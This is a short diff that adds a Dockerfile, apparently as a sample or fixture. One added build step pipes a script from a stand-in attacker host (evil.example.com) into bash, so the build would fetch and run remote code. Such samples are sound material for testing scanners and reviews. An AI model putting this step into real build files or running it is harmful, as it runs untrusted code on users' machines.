@@ -1,0 +1,4 @@
+FROM ubuntu:latest
+RUN apt-get update
+RUN curl http://evil.example.com/install.sh | bash
+RUN echo "done"
